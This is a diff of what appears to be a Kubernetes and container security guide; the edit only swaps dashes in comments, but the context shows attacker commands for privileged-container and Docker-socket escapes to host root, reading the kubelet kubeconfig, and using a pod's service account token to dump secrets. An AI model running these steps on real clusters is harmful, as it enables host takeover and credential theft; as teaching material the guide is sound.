@@ -187,7 +187,7 @@ When a container is launched with `--privileged` (or `securityContext.privileged
 
 ```bash
 # Attacker is inside a privileged container.
-# List host block devices — visible because --privileged removes device namespace restrictions.
+# List host block devices: visible because --privileged removes device namespace restrictions.
 ls /dev/sd*
 
 # Mount the host root filesystem into /mnt inside the container.
@@ -196,7 +196,7 @@ ls /dev/sd*
 mount /dev/sda1 /mnt
 
 # Chroot into the mounted host filesystem for full host access.
-# The container boundary is gone — the attacker now operates as root on the host OS.
+# The container boundary is gone: the attacker now operates as root on the host OS.
 chroot /mnt /bin/bash
 ```
 
@@ -240,7 +240,7 @@ This misconfiguration is extremely common in CI/CD environments: Jenkins agents,
 ls -la /var/run/docker.sock
 
 # Use the Docker CLI to launch a new privileged container that mounts the host root.
-# The Docker daemon — running as root — creates this container on behalf of the attacker.
+# The Docker daemon (running as root) creates this container on behalf of the attacker.
 # No kernel exploit required: we are instructing the privileged daemon to comply.
 docker run -v /:/hostfs --rm -it ubuntu:latest chroot /hostfs /bin/bash
 
@@ -290,7 +290,7 @@ spec:
 ```
 
 ```bash
-# Read the node kubelet kubeconfig — contains TLS client credentials the kubelet
+# Read the node kubelet kubeconfig: contains TLS client credentials the kubelet
 # uses to authenticate to the API server; stealing these allows impersonating the node.
 kubectl exec hostpath-escape -- cat /hostfs/etc/kubernetes/kubelet.conf
 
@@ -352,13 +352,13 @@ Service Account Token Abuse
 Every pod is automatically mounted with a service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This JWT authenticates to the API server. If the service account has overly broad RBAC permissions, any attacker who compromises a pod in that namespace inherits those permissions.
 
 ```bash
-# Extract the mounted SA token and CA cert — present in every pod by default
+# Extract the mounted SA token and CA cert: present in every pod by default
 # unless automountServiceAccountToken is explicitly disabled.
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 APISERVER=https://kubernetes.default.svc
 
-# If the SA can list secrets, this dumps all secrets in the namespace —
+# If the SA can list secrets, this dumps all secrets in the namespace,
 # including other SA tokens, TLS certificates, database passwords, and API keys.
 curl -s --cacert $CACERT \
   -H "Authorization: Bearer $TOKEN" \
@@ -572,7 +572,7 @@ RBAC Misconfigurations
 Service Account Exploitation
 
 ```bash
-# From inside a pod — check mounted service account token
+# From inside a pod: check mounted service account token
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
 # Use token to query Kubernetes API
